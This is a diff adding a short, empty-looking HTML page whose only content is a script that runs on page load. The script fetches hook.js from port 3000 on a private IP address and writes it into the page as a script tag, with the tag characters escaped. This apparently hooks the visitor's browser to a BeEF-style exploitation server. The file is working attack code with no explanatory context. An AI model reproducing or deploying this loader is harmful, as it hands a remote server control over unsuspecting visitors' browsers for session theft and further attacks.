@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <script type="text/javascript">
+        function InjectPayload() {
+            var xmlhttp;
+            if (window.XMLHttpRequest) {
+                xmlhttp = new XMLHttpRequest();
+            }
+            else {
+                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+            xmlhttp.open("GET", "http://172.16.239.128:3000/hook.js", false);
+            xmlhttp.send();
+            if (xmlhttp.status == 200) {
+                var str = xmlhttp.responseText;
+                document.write("\x3Cscript\x3E" + str + "\x3C/script\x3E");
+            }
+        }
+    </script>
+</head>
+<body onload="InjectPayload();">
+</body>
+</html>
